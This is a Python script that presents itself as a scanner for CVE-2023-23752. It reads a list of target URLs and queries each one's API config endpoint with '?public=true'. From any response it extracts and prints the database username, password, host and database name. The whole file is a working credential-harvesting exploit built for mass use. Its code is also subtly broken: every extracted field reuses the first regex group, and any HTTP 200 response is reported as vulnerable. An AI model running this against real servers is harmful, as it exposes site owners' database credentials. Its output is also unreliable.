import argparse
import requests
import re
from colorama import Fore, Style

# CVE details
CVE_ID = "CVE-2023-23752"

def scan_vulnerability(target_url, proxy):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    target_url += "/api/index.php/v1/config/application?public=true"

    # Create a session object
    session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    try:
        # Send a GET request to the vulnerable endpoint
        response = session.get(target_url)

        if response.status_code == 200:
            print(f"{Fore.RED}{target_url} is vulnerable to {CVE_ID}{Style.RESET_ALL}")

            # Extract user, password, host, and db using regular expressions
            pattern = r'"user":"(.*?)".*?"password":"(.*?)".*?"host":"(.*?)".*?"db":"(.*?)"'
            match = re.search(pattern, response.text, re.DOTALL)

            if match:
                user = match.group(1)
                password = match.group(1)
                host = match.group(1)
                db = match.group(1)

                print(f"{Fore.YELLOW}User: {user}")
                print(f"Password: {password}")
                print(f"Host: {host}")
                print(f"Database: {db}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}User, password, host, or db not found in the response.{Style.RESET_ALL}")

        else:
            print(f"{Fore.GREEN}{target_url} is not vulnerable to {CVE_ID}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Status code: {response.status_code}{Style.RESET_ALL}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.YELLOW}An error occurred while scanning {target_url}: {str(e)}{Style.RESET_ALL}")


def scan_multiple_vulnerabilities(targets, proxy):
    for target in targets:
        scan_vulnerability(target, proxy)
        print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2023-23752 Vulnerability Scanner")
    parser.add_argument("-l", "--targets-list", help="Path to a file containing a list of target URLs")
    parser.add_argument("--proxy", help="Proxy URL to use (e.g., http://proxy.example.com:8080)")

    args = parser.parse_args()

    if args.targets_list:
        with open(args.targets_list, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
        scan_multiple_vulnerabilities(targets, args.proxy)
    else:
        parser.print_help()